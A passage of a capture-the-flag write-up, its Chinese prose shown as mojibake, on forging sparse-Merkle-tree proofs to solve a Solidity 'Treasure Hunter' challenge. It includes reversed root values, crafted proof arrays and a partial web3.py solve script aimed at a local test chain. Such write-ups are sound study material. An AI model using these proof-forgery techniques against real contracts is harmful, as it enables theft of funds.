chest\"\n        );\n        haveTreasureChest[msg.sender] = true;\n        smtMode = SMT.Mode.BlackList;\n        emit PickupTreasureChest(msg.sender);\n    &#125;\n\n    function openTreasureChest() public &#123;\n        require(haveKey[msg.sender] &amp;&amp; haveTreasureChest[msg.sender]);\n        solved = true;\n        emit OpenTreasureChest(msg.sender);\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return solved;\n    &#125;\n&#125;\n\nanalyzerwctfä¸­æœ‰ä¸€é“åŒåå¯†ç é¢˜ï¼Œå€Ÿé‰´äº†ä¸€ä¸‹ï¼Œå±žäºŽæ˜¯æ”¶åˆ°äº†å¾ˆå¤§çš„å¯å‘å§ï¼Œä¸»è¦æ˜¯è€ƒå¯Ÿç®—æ³•ç†è§£èƒ½åŠ›ã€‚wpé“¾æŽ¥ï¼šhttps://r3kapig.com/writeup/20220125-rwctf4/#treasure-hunter\né¢˜ç›®é€šè¿‡ä»£ç å®žçŽ°äº†ä¸€ä¸ªç¨€ç–çš„é»˜å…‹å°”æ ‘çš„åŠŸèƒ½ã€‚\nstruct Leaf &#123;\n    address key;\n    uint8 value;\n&#125;\n\næ¯ä¸€ç‰‡å¶å­çš„hashç”±calcLeafå‡½æ•°è®¡ç®—ï¼Œå¦‚æžœå¶å­çš„valueä¸º0ï¼Œhashåˆ™ä¸º0ï¼Œå¦åˆ™å°†keyå’Œvalueè¿›è¡Œæ‹¼æŽ¥åœ¨è¿›è¡Œhashè®¡ç®—\nfunction calcLeaf(Leaf memory a) internal pure returns (bytes32) &#123;\n    if (a.value == 0) &#123;\n        return 0;\n    &#125; else &#123;\n        return keccak256(abi.encode(a.key, a.value));\n    &#125;\n&#125;\n\nmergeå‡½æ•°å’ŒcalcLeafå‡½æ•°å®žçŽ°æ–¹æ³•å‡ ä¹Žä¸€æ ·ï¼Œå¦‚æžœæœ‰0åˆ™è¿”å›žéž0å€¼ï¼Œå¦åˆ™æ‹¼æŽ¥åœ¨è¿›è¡Œhashè®¡ç®—\nè§£é¢˜å…³é”®åœ¨äºŽè¯»æ‡‚calcRootï¼ŒæŽ¥å—_proofså’Œ_leavesç”¨æ¥è®¡ç®—rootï¼Œproofså¯ä»¥ç†è§£ä¸ºopcodeæ“ä½œç \n\n0x4c: æŠŠ leaf åŽ‹æ ˆ\n0x50 height proof: æŠŠæ ˆé¡¶ä¸€ä¸ªé«˜åº¦ä¸ºheightçš„å…ƒç´ ï¼Œä¸Žproofåˆå¹¶ï¼Œäº§ç”Ÿä¸€ä¸ªé«˜åº¦ä¸ºheight+1çš„å…ƒç´ \n0x48 height: æŠŠæ ˆé¡¶ä¸¤ä¸ªé«˜åº¦ä¸ºheightå…ƒç´ ï¼Œåˆå¹¶æˆä¸€ä¸ªé«˜åº¦ä¸ºheight+1çš„å…ƒç´ \n\nproofä¸ä»…åŒ…æ‹¬äº†opcodeè¿˜åŒ…æ‹¬äº†heightç­‰å…¶ä»–è®¡ç®—rootçš„é‡è¦å‚æ•°ï¼Œæ‰€ä»¥ä¸€å®šè¦è¯»æ‡‚è¯¥å‡½æ•°æ‰èƒ½åˆç†å®‰æŽ’é¡ºåºæž„é€ proofã€‚\nå¾—åˆ°flagçš„è¦æ±‚å°±æ˜¯pickupTreasureChestå’Œfindkeyï¼Œéƒ½æœ‰ä¸€ä¸ªå…±åŒçš„é™åˆ¶æ¡ä»¶å°±æ˜¯teamçš„é•¿åº¦è¦å¤§äºŽ4ï¼Œæ‰€ä»¥è¦å…ˆä½¿ç”¨4ä¸ªä¸åŒçš„accountè°ƒç”¨enterï¼Œæ¯ä¸€æ¬¡è°ƒç”¨éƒ½ä¼šéªŒè¯å½“å‰å¶å­æ˜¯å¦å­˜åœ¨äºŽæ ‘ä¸Šã€‚ç”±æ­¤äº§ç”Ÿäº†æœ¬é¢˜çš„ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæ€Žæ ·æ»¡è¶³è°ƒç”¨enteræ—¶éœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚(æ³¨æ„è¿™é‡Œæ˜¯æœ‰å‘çš„ï¼Œaccountå¿…é¡»è¦ä»Žå°åˆ°å¤§çš„é¡ºåºå¾…ç”¨enterï¼Œå¦åˆ™åœ¨è°ƒç”¨pickupTreasureChestæ—¶å€™è¿‡ä¸åŽ»require(checkGroupSorted(_leaves))çš„éªŒè¯)\nfunction checkGroupSorted(Leaf[] memory _leaves) internal pure returns (bool) &#123;\n       require(_leaves.length >= 1);\n       uint160 temp = 0;\n       for (uint256 i = 0; i &lt; _leaves.length; i++) &#123;\n           if (temp >= uint160(_leaves[i].key)) &#123;\n               return false;\n           &#125;\n           temp = uint160(_leaves[i].key);\n       &#125;\n       return true;\n   &#125;\n   \n   æ­£æ˜¯ç”±äºŽå¿½ç•¥äº†è¿™éƒ¨åˆ†ä»£ç ï¼Œå¯¼è‡´ä¹‹å‰çš„è°ƒç”¨é¡ºåºæ˜¯ä¹±çš„ï¼Œå¯¼è‡´æž„é€ çš„pickupTreasureChestçš„proofæ— æ³•é€šè¿‡éªŒè¯ï¼Œæ­£æ˜¯ç”±äºŽè¿™ä¸ªåŽŸå› ï¼Œåœ¨æ¯”èµ›æœŸé—´è¿™é“é¢˜æ²¡æœ‰åšå‡ºæ¥\n\næŠŠé¢˜ç›®åˆçº¦ä¸­çš„è®¡ç®—éƒ¨åˆ†æŠ½å‡ºæ¥ç”¨æ¥è®¡ç®—æ¯ä¸€æ­¥çš„å€¼è¿›è¡Œé€†è¿ç®—å¾—åˆ°åˆå§‹lå’Œr\ncontract ctf  &#123;\n    function calcLeaf(address a,uint8 i)public view returns(bytes32)&#123;\n        return keccak256(abi.encode(a,i));\n    &#125;\n    function getBit(uint160 key, uint256 height) public pure returns (uint256) &#123;\n        return (key >> height) &amp; 1;\n    &#125;\n    function merge(bytes32 l, bytes32 r) public pure returns (bytes32) &#123;\n        if (l == 0) &#123;\n            return r;\n        &#125; else if (r == 0) &#123;\n            return l;\n        &#125; else &#123;\n            return keccak256(abi.encode(l, r));\n        &#125;\n    &#125;\n    function parentPath(uint160 key, uint256 height) public pure returns (uint160) &#123;\n        return copyBit(key, height + 1);\n    &#125;\n    function copyBit(uint160 key, uint256 height) internal pure returns (uint160) &#123;\n        return ((key >> height) &lt;&lt; height);\n    &#125;\n    function getkey(address a)public view returns(uint160)&#123;\n        return uint160(a);\n    &#125;\n&#125;\n\næ ¹æ®initå‡½æ•°ä¸­æä¾›çš„hunterså’Œå¯¹åº”çš„opcodeï¼Œæ‰‹åŠ¨æŒ‰é¡ºåºæ¥é€†è¿ç®—å‡ºç”Ÿæˆrootæ—¶å¯¹åº”çš„lå’Œrï¼Œå¯¹åº”è¿‡ç¨‹å¦‚ä¸‹\nkey[0]&#x3D;67195782237580418295514311543555631277138434366\n\nvalue[0]&#x3D;0x42091f1481d9d568ab08dce0e8f3911898017e21906034ecd2118d2763b99d9c\n\n\n\nkey[1]&#x3D;597733001430176024049334587394716596403930790981\n\nvalue[1]&#x3D;0x2063a2b5df4feb4eafc67a25e78de774944b78020cd06ecd374fed9015fb4611\n\n\n\nkey[2]&#x3D;611382286831621467233887798921843936019654057231\n\nvalue[2]&#x3D;0x28c420d41601e064fc8cc12b320362ca54019acc8f163ced66d9dc6175c08828\n\n\n\nkey[3]&#x3D;612056933926044330453951588849579298520690135010\n\nvalue[3]&#x3D;0x1b6f546f2f331bc5096695091bf5acea54870c174dc1db4fa7a9ad56b0384b40\n\n\n\n\naset&#x3D;0\n\nkey[2]&#x3D;610862012478150829092946394924383918371815555072\n\nkey[3]&#x3D;610862012478150829092946394924383918371815555072\n\nvalue[2]&#x3D;0x213efbd08a6ee2d6bb2b0b1fd0e5ae51a23a4c01f9d512297fc6047904134a27\n\n\n\naset&#x3D;0\n\nkey[1]&#x3D;593735040165679310520246963290989976735222595584\n\nkey[2]&#x3D;593735040165679310520246963290989976735222595584\n\nvalue[1]&#x3D;0xb5b476b49d923292d3ec729b3dddf94c1e917dd3e58ba754da05f9d8699b3736\n\n \n\n\naset&#x3D;0\n\nkey[0]&#x3D;0\n\nkey[1]&#x3D;0\n\nvalue[0]&#x3D;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\n\n\n\n\n\nkey[1]&#x3D;978200031609045874420567273872976536139233684635\n\nvalue[1]&#x3D;0x06888f968192a70674eacf045568b8ea9498309e832d1afd30932de111b5de81\n\n\n\nkey[2]&#x3D;1096451400262405796991039590211805051831004063880\n\nvalue[2]&#x3D;0x3815ddcd584b5527f7ceffc40c0107318577faa17dfc2b32a35b8513b0f0f950\n\n\n\nkey[3]&#x3D;1217167119161789330316589216740865579008239390034\n\nvalue[3]&#x3D;0x1354cde30ff01cefe86de5e324565b9387a794adcf8cd1ddeaf76e7fff0106b0\n\n\n\nkey[4]&#x3D;1248875146012964071876423320777688075155124985543\n\nvalue[4]&#x3D;0x591a3b2777bc31889c69fb5cad740ac457874aa5ce74c0ad08912df8ad7d112c\n\ntop&#x3D;5\n\n\n\n\naset&#x3D;0\n\nkey[3]&#x3D;1187470080331358621040493926581979953470445191168\n\nkey[4]&#x3D;1187470080331358621040493926581979953470445191168\n\nvalue[3]&#x3D;0x5e2d4ac1a991f07a58b5b59b2ca7427ff1e928a4aa95a868b82d67a8173c8306\n\n\n\naset&#x3D;0\n\nkey[2]&#x3D;1096126227998177188652763624537212264741949407232\n\nkey[3]&#x3D;1096126227998177188652763624537212264741949407232\n\nvalue[2]&#x3D;0xf4d48cacb338d80223fa2a9769ddfc803cc33d764ba4e5a0f5c304f2eb7cf5bc\n\n\n\naset&#x3D;0\n\nkey[1]&#x3D;730750818665451459101842416358141509827966271488\n\nkey[2]&#x3D;730750818665451459101842416358141509827966271488\n\nvalue[1]&#x3D;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\n\n\n\naset&#x3D;0\n\nkey[0]&#x3D;0\n\nkey[1]&#x3D;0\n\nvalue[0]&#x3D;0xe2e8ebf79be9c50374592f83db1c4c82e4d97b4dae6dc26332d259289467ff8e\n\n\næœ€ç»ˆå¾—åˆ°initäº§ç”Ÿçš„rootæ˜¯ç”±ä»¥ä¸‹çš„lå’Œrè¿›è¡Œmergeè€Œæ¥çš„ï¼š\n\nl&#x3D;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\n\nr&#x3D;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\n\n\nå¾—åˆ°äº†åˆå§‹åŒ–æ—¶æ‰€ç”¨çš„lå’Œrä¹‹åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥æž„é€ enteræ‰€ç”¨çš„proofäº†\næˆ‘æ‰€ç”¨çš„è´¦æˆ·å¦‚ä¸‹ï¼š\naccount1ï¼š0x749F4eddefA7C74Adf35892Ee1bbf76884728b34\naccount2ï¼š0xc2f71D890910F7E34cfd4Aef8079b814c0b6711f\naccount3ï¼š0xC8aF1811a07FfeB80FF7A00662338E3D079F1Cdf\naccount4ï¼š0xcD21ba755eFC7c73900e63C2b36d2134f5E712Ba\n\næ³¨æ„ï¼šéªŒè¯æ—¶éªŒè¯valueä¸º0çš„leaveså³nextleavesï¼Œæ›´æ–°æŒ‡å®šä½ç½®çš„hashå€¼æ—¶æ›´æ–°çš„æ˜¯valueä¸º1çš„leaveså³nextleavesã€‚\nçŸ¥é“äº†ä»¥ä¸Šè¿™äº›å°±å¯ä»¥æž„é€ å‡ºå››æ¬¡è°ƒç”¨enterçš„proofå¦‚ä¸‹\n1ï¼š0x749F4eddefA7C74Adf35892Ee1bbf76884728b34:\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009c&quot;,&quot;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009c&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\nç¬¬ä¸€æ¬¡åŽ‹æ ˆæ—¶leaf.valueä¸º0æ‰€ä»¥stackvalueä¸º0ï¼Œæ‰€ä»¥ä¸¤æ¬¡0x50è¿›è¡Œåˆå¹¶æ“ä½œè®¡ç®—çš„æ˜¯l:0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17lå’Œr:0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2è¿›è¡Œmergeçš„ç»“æžœï¼Œè€Œå®žé™…æ›´æ–°çš„rootæ˜¯ç”±leaf.valueä¸º1æ—¶å¯¹åº”è¯¥proofæ‰€è®¡ç®—å‡ºçš„rootï¼Œå¯¹åº”çš„ä¼šæ›´æ–°æ–°çš„lè€Œrä¸ä¼šå˜ï¼Œæ¯”å¦‚æ­¤å¤„è¿›è¡Œenterä¹‹åŽlå’Œrä¼šå˜ä¸ºå¦‚ä¸‹\nl:0xf726c3600caf4ae2dc00053b4afe24456ac19369a5be709f08fcc06422ddaaed\nrï¼š0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\n\nå¦‚ä¸‹æž„é€ åŒä¸Šã€‚\n2ï¼š0xc2f71D890910F7E34cfd4Aef8079b814c0b6711f\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000099&quot;,&quot;0xf726c3600caf4ae2dc00053b4afe24456ac19369a5be709f08fcc06422ddaaed&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000099&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n3ï¼š0xC8aF1811a07FfeB80FF7A00662338E3D079F1Cdf\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xb0d1fdbfcc8a700fa28d1c7de5c93ce07f599052695b20ed2e93a206c573bcdc&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\n4ï¼š0xcD21ba755eFC7c73900e63C2b36d2134f5E712Ba\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xef4cf01a185126f8fd9d2323968857bc6d05b860d81bf93e9c7d43ad068aafc8&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\næž„é€ äº†å¦‚ä¸‹å›¾çš„æ ‘çŠ¶:\n\næŽ¥ä¸‹æ¥ä¾æ®å››æ¬¡çš„msg.sengerå’Œproofæž„é€ æ–°çš„proofç”¨ä»¥é€šè¿‡pickupTreasureChestå‡½æ•°ä¸­çš„requireæ¡ä»¶\næ³¨æ„è¦æ±‚å–åŒä¸€é«˜åº¦çš„æ¯”ç‰¹ä½å€¼ä¸ç›¸åŒæž„é€ å¾—ï¼š\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009e&quot;,&quot;0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\nä½¿ç”¨è¯¥æ•°ç»„è°ƒç”¨pickupTreasureChestå‡½æ•°ï¼Œæ­¤æ—¶smtMode &#x3D; SMT.Mode.BlackListæ»¡è¶³äº†findkeyå‡½æ•°ä¸‹çš„ç¬¬ä¸€ä¸ªé™åˆ¶æ¡ä»¶\næ­¤å¤„smtå·²ç»å˜ä¸º0ï¼Œç›¸å¯¹æ¥è¯´è¦ç®€å•ä¸€äº›ï¼Œæž„é€ proofç”¨æ¥æ»¡è¶³ç¬¬ä¸‰ä¸ªé™åˆ¶æ¡ä»¶ï¼Œåœ¨æ­¤å¤„å‚è€ƒä¸Šä¸€æ­¥æž„é€ çš„heightï¼ŒåŠé‚£ä¸ªç”¨æ¥ç”Ÿæˆrootçš„lä»¥åŠrï¼š0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2å¡žè¿›åŽ»å°±æ»¡è¶³äº†æœ€ç»ˆé™åˆ¶æ¡ä»¶ã€‚å¾—åˆ°proofå¦‚ä¸‹ï¼š\n[&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000004c&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000048&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009c&quot;,&quot;0xfcf770421cd6535f7b5b39c39da3a2bc134e41abfec46997159f902b793c7765&quot;,&quot;0x0000000000000000000000000000000000000000000000000000000000000050&quot;,&quot;0x000000000000000000000000000000000000000000000000000000000000009f&quot;,&quot;0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2&quot;]\n\nattackæž„é€ å®Œæˆä¹‹åŽå°±æ²¡æœ‰éš¾åº¦äº†ï¼ŒæŒ‰é¡ºåºè°ƒç”¨å‡½æ•°å³å¯\nfrom web3 import Web3,HTTPProvider\nfrom time import sleep\nw3=Web3(HTTPProvider('HTTP://127.0.0.1:7545'))\nabi='''\n[\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"constructor\"\n\t&#125;,\n\t&#123;\n\t\t\"anonymous\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"indexed\": true,\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"_from\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"FindKey\",\n\t\t\"type\": \"event\"\n\t&#125;,\n\t&#123;\n\t\t\"anonymous\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"indexed\": true,\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"_from\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"OpenTreasureChest\",\n\t\t\"type\": \"event\"\n\t&#125;,\n\t&#123;\n\t\t\"anonymous\": false,\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"indexed\": true,\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"_from\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"PickupTreasureChest\",\n\t\t\"type\": \"event\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"checkteam\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"enter\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"findKey\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"haveKey\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"address\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"address\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"haveTreasureChest\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"isSolved\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"leave\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"openTreasureChest\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32[]\",\n\t\t\t\t\"name\": \"_proofs\",\n\t\t\t\t\"type\": \"bytes32[]\"\n\t\t\t&#125;\n\t\t],\n\t\t\"name\": \"pickupTreasureChest\",\n\t\t\"outputs\": [],\n\t\t\"stateMutability\": \"nonpayable\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"root\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bytes32\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bytes32\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"smtMode\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"enum SMT.Mode\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"uint8\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;,\n\t&#123;\n\t\t\"inputs\": [],\n\t\t\"name\": \"solved\",\n\t\t\"outputs\": [\n\t\t\t&#123;\n\t\t\t\t\"internalType\": \"bool\",\n\t\t\t\t\"name\": \"\",\n\t\t\t\t\"type\": \"bool\"\n\t\t\t&#125;\n\t\t],\n\t\t\"stateMutability\": \"view\",\n\t\t\"type\": \"function\"\n\t&#125;\n]\n'''\nprivatekey1='your_privatekey1'\nprivatekey2='your_privatekey2'\nprivatekey3='your_privatekey3'\nprivatekey4='your_privatekey4'\n\nacct1=w3.eth.account.from_key(privatekey1)\nacct2=w3.eth.account.from_key(privatekey2)\nacct3=w3.eth.account.from_key(privatekey3)\nacct4=w3.eth.account.from_key(privatekey4)\n\naddress='your_contract_address'\ncontract=w3.eth.contract(abi=abi,address=address)\n\nenter1=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009c\",\"0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009c\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nenter2=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x0000000000000000000000000000000000000000000000000000000000000099\",\"0xf726c3600caf4ae2dc00053b4afe24456ac19369a5be709f08fcc06422ddaaed\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x0000000000000000000000000000000000000000000000000000000000000099\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nenter3=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xb0d1fdbfcc8a700fa28d1c7de5c93ce07f599052695b20ed2e93a206c573bcdc\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nenter4=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xef4cf01a185126f8fd9d2323968857bc6d05b860d81bf93e9c7d43ad068aafc8\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\npick=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009e\",\"0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x0000000000000000000000000000000000000000000000000000000000000000\",\"0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2\"]\nfind=[\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x000000000000000000000000000000000000000000000000000000000000004c\",\"0x0000000000000000000000000000000000000000000000000000000000000048\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009c\",\"0xfcf770421cd6535f7b5b39c39da3a2bc134e41abfec46997159f902b793c7765\",\"0x0000000000000000000000000000000000000000000000000000000000000050\",\"0x000000000000000000000000000000000000000000000000000000000000009f\",\"0xba13a52ab7206462770